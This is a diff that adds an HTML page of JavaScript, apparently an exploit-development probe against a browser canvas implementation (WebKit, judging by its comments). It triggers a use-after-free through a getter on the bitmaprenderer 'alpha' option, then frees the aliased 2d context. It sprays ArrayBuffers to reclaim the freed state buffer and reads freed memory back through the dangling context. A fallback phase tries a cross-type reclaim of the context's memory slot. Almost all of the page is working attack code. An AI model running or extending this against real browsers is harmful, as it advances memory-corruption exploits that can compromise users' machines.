@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V538</title>
+<style>body{font:11px monospace;background:#111;color:#0f0;margin:8px}
+#log{white-space:pre-wrap;word-break:break-all}</style>
+</head><body>
+<div id="log">V538 — sizeof(State) empirical probe
+Loading...</div>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+='\n'+m}
+var T0=Date.now();
+function B(tag,body){
+  var msg='['+(Date.now()-T0)+'ms] '+(body||'');
+  log('>> '+tag+': '+msg);
+  try{var x=new XMLHttpRequest();x.open('POST','/beacon/V538-'+tag,false);
+  x.setRequestHeader('Content-Type','text/plain');x.send(msg)}catch(e){}
+}
+window.onerror=function(m,s,l,c,e){B('ONERROR',m+' at '+s+':'+l+':'+c)};
+B('BOOT',navigator.userAgent);
+
+// =====================================================
+// T1: sizeof(State) via stateStack buffer reclaim
+// Strategy: 1 save → stateStack capacity 2 → buffer = 2*sizeof(State)
+// Free context, spray ABs at various sizes to find which reclaims buffer
+// =====================================================
+
+var dangling, official, officialCanvas, aliasIdx;
+var PHASE = 0;
+
+// Phase 1: Create aliased pair
+setTimeout(function(){
+  try {
+    B('P1-START','creating aliased pair');
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var inner = null;
+    var s = {};
+    Object.defineProperty(s, 'alpha', {
+      get: function() { inner = c.getContext('2d'); return true; }
+    });
+    c.getContext('bitmaprenderer', s);
+    if (!inner) { B('P1-FAIL','no inner'); return; }
+
+    var ctxs = [];
+    for (var i = 0; i < 200; i++) {
+      var nc = document.createElement('canvas');
+      nc.width = 1; nc.height = 1;
+      var nctx = nc.getContext('2d');
+      nctx.lineWidth = 200 + i;
+      ctxs.push({canvas: nc, ctx: nctx});
+    }
+
+    var dlw = inner.lineWidth;
+    if (dlw >= 200 && dlw < 400) {
+      aliasIdx = dlw - 200;
+      dangling = inner;
+      official = ctxs[aliasIdx].ctx;
+      officialCanvas = ctxs[aliasIdx].canvas;
+      window._ctxs = ctxs;
+      B('P1-OK','aliased at #'+aliasIdx+' lw='+dlw);
+      PHASE = 1;
+    } else {
+      B('P1-MISS','lw='+dlw);
+    }
+  } catch(e) { B('P1-ERR',''+e); }
+}, 200);
+
+// Phase 2: Grow stateStack and set markers
+setTimeout(function(){
+  if (PHASE < 1) { B('P2-SKIP','no alias'); return; }
+  try {
+    B('P2-START','growing stateStack');
+
+    // Set distinctive lineWidth before save
+    official.lineWidth = 999.5;
+    official.globalAlpha = 0.123456;
+    official.setTransform(11.11, 22.22, 33.33, 44.44, 55.55, 66.66);
+    official.lineDashOffset = 777.7;
+    official.miterLimit = 888.8;
+
+    // save() copies current state → stateStack grows from inline(1) to heap(2)
+    official.save();
+
+    // Force realize by reading state
+    var rlw = official.lineWidth;
+    B('P2-REALIZED','lw='+rlw+' ga='+official.globalAlpha);
+
+    // Also set different values after save for entry[1]
+    official.lineWidth = 555.5;
+    official.globalAlpha = 0.654321;
+
+    // Read to confirm
+    var lw2 = official.lineWidth;
+    B('P2-TOP','entry[1] lw='+lw2+' ga='+official.globalAlpha);
+
+    PHASE = 2;
+  } catch(e) { B('P2-ERR',''+e); }
+}, 1500);
+
+// Phase 3: Free context
+setTimeout(function(){
+  if (PHASE < 2) { B('P3-SKIP','not ready'); return; }
+  try {
+    B('P3-START','freeing context');
+
+    // Free via bitmaprenderer on the official canvas
+    var s2 = {};
+    Object.defineProperty(s2, 'alpha', { get: function() { return true; } });
+    officialCanvas.getContext('bitmaprenderer', s2);
+
+    B('P3-FREED','context freed, stateStack buffer freed');
+    PHASE = 3;
+  } catch(e) { B('P3-ERR',''+e); }
+}, 3000);
+
+// Phase 4: Read dangling BEFORE spray to confirm old values readable
+setTimeout(function(){
+  if (PHASE < 3) { B('P4-SKIP','not ready'); return; }
+  try {
+    B('P4-START','reading freed memory');
+
+    // lineWidth should still be readable from freed-but-mapped memory
+    var lw = dangling.lineWidth;
+    B('P4-LW','lineWidth='+lw+' (expect 555.5 if state[1] or 999.5 if state[0])');
+    PHASE = 4;
+  } catch(e) {
+    B('P4-CRASH',''+e+' — lineWidth on freed context crashes');
+    // If this crashes, the Vector header or m_buffer was corrupted by free list
+    PHASE = -1;
+  }
+}, 4500);
+
+// Phase 5: Spray ABs to reclaim stateStack buffer
+// Try sizes from 640 to 3200 in steps of 64
+// Each AB filled with unique marker: value = size + (byteOffset/8)*0.001
+setTimeout(function(){
+  if (PHASE < 4) { B('P5-SKIP','not ready (phase='+PHASE+')'); return; }
+  try {
+    B('P5-START','spraying stateStack buffer sizes');
+    var baseLw = dangling.lineWidth;
+    B('P5-BASE','baseline lw='+baseLw);
+
+    // Dense sweep of buffer sizes
+    // sizeof(State) est 480-560, buffer = 2*sizeof(State) = 960-1120
+    // bmalloc size classes: try surrounding range
+    var sizes = [];
+    for (var s = 640; s <= 1600; s += 32) sizes.push(s);
+    // Also try larger in case sizeof(State) is bigger
+    sizes.push(1664, 1792, 1920, 2048, 2304, 2560, 3072);
+
+    var hitFound = false;
+
+    for (var si = 0; si < sizes.length; si++) {
+      var sz = sizes[si];
+      var spray = [];
+      for (var j = 0; j < 200; j++) {
+        var ab = new ArrayBuffer(sz);
+        var dv = new DataView(ab);
+        // Write unique markers at every 8-byte position
+        // marker = sz + (position/8) * 0.001
+        for (var k = 0; k < sz; k += 8) {
+          dv.setFloat64(k, sz + (k / 8) * 0.001, true);
+        }
+        spray.push(ab);
+      }
+
+      // Read lineWidth through dangling
+      try {
+        var lw = dangling.lineWidth;
+        if (lw !== baseLw && !isNaN(lw) && lw !== 0) {
+          // HIT! The stateStack buffer was reclaimed
+          var hitSize = Math.floor(lw);
+          var hitPos = Math.round((lw - hitSize) * 1000);
+          var hitByteOff = hitPos * 8;
+          B('P5-HIT','SIZE='+sz+' lw='+lw+' decoded: bufSize='+hitSize+' position='+hitPos+' byteOffset='+hitByteOff);
+
+          // Also read other state fields
+          try {
+            var ga = dangling.globalAlpha;
+            B('P5-HIT-GA','globalAlpha='+ga);
+          } catch(e2) { B('P5-HIT-GA-ERR',''+e2); }
+          try {
+            var t = dangling.getTransform();
+            B('P5-HIT-TX','a='+t.a+' b='+t.b+' c='+t.c+' d='+t.d+' e='+t.e+' f='+t.f);
+          } catch(e2) { B('P5-HIT-TX-ERR',''+e2); }
+          try {
+            var miter = dangling.miterLimit;
+            B('P5-HIT-ML','miterLimit='+miter);
+          } catch(e2) { B('P5-HIT-ML-ERR',''+e2); }
+          try {
+            var ldo = dangling.lineDashOffset;
+            B('P5-HIT-LDO','lineDashOffset='+ldo);
+          } catch(e2) { B('P5-HIT-LDO-ERR',''+e2); }
+
+          hitFound = true;
+          break;
+        }
+        // No hit at this size — lineWidth unchanged
+        if (si % 8 === 0) {
+          B('P5-SWEEP','sizes '+sz+'-'+(sz+7*32)+' lw='+lw);
+        }
+      } catch(e) {
+        B('P5-SIZE-'+sz+'-ERR',''+e);
+        break;
+      }
+    }
+
+    if (!hitFound) {
+      B('P5-MISS','no size matched, final lw='+dangling.lineWidth);
+    }
+
+    PHASE = 5;
+  } catch(e) { B('P5-ERR',''+e); }
+}, 6000);
+
+// Phase 6: If Phase 4 crashes, try cross-type reclaim of 768B slot instead
+// This is the AB(768) approach where we control m_stateStack fields directly
+setTimeout(function(){
+  if (PHASE !== -1) { B('P6-SKIP','phase4 worked, using stateStack path'); return; }
+  try {
+    B('P6-START','cross-type reclaim of 768B context slot');
+
+    // Need fresh UAF since dangling is dead after P4 crash
+    // Create new aliased pair
+    var c6 = document.createElement('canvas');
+    c6.width = 1; c6.height = 1;
+    var d6 = null;
+    var s6 = {};
+    Object.defineProperty(s6, 'alpha', {
+      get: function() { d6 = c6.getContext('2d'); return true; }
+    });
+    c6.getContext('bitmaprenderer', s6);
+
+    var ctxs6 = [];
+    for (var i = 0; i < 200; i++) {
+      var nc = document.createElement('canvas');
+      nc.width = 1; nc.height = 1;
+      var nctx = nc.getContext('2d');
+      nctx.lineWidth = 500 + i;
+      ctxs6.push({canvas: nc, ctx: nctx});
+    }
+    var dlw6 = d6.lineWidth;
+    if (dlw6 < 500 || dlw6 >= 700) { B('P6-NO-ALIAS','lw='+dlw6); return; }
+    var idx6 = dlw6 - 500;
+    var off6 = ctxs6[idx6].ctx;
+    var offCanvas6 = ctxs6[idx6].canvas;
+    B('P6-ALIAS','at #'+idx6);
+
+    // Set marker, NO save (stateStack stays inline with 1 entry)
+    off6.lineWidth = 333.3;
+
+    // Free context
+    var s6b = {};
+    Object.defineProperty(s6b, 'alpha', { get: function() { return true; } });
+    offCanvas6.getContext('bitmaprenderer', s6b);
+    B('P6-FREED','context freed');
+
+    // Spray AB(768) to reclaim the 768B context slot
+    // DON'T write to offset 0 (vtable) — leave it as whatever bmalloc wrote
+    // DO write a self-referencing pattern for m_stateStack
+    var spray6 = [];
+    for (var j = 0; j < 500; j++) {
+      var ab = new ArrayBuffer(768);
+      var dv = new DataView(ab);
+      // Write markers at every 8-byte position (skip offset 0 for vtable)
+      for (var k = 8; k < 768; k += 8) {
+        dv.setFloat64(k, 768.0 + (k/8) * 0.001, true);
+      }
+      spray6.push(ab);
+    }
+
+    // Try reading lineWidth through dangling
+    // This will follow m_stateStack.m_buffer (now our AB data) → likely crash
+    // But if m_buffer happens to point to valid memory...
+    try {
+      var lw6 = d6.lineWidth;
+      B('P6-READ','lw='+lw6+' — cross-type read WORKED!');
+    } catch(e) {
+      B('P6-READ-ERR',''+e+' — m_buffer deref crashed (expected)');
+    }
+
+    // Alternative: read properties that don't dereference pointers
+    // Check if any property on the JS wrapper is a direct data access
+    try {
+      // canvas property returns the HTMLCanvasElement (stored as pointer in context)
+      // This WOULD crash if it dereferences the pointer
+      B('P6-INFO','cross-type reclaim needs known m_buffer address');
+    } catch(e) {}
+
+  } catch(e) { B('P6-ERR',''+e); }
+}, 12000);
+
+setTimeout(function(){B('COMPLETE','all phases done')},16000);
+</script></body></html>
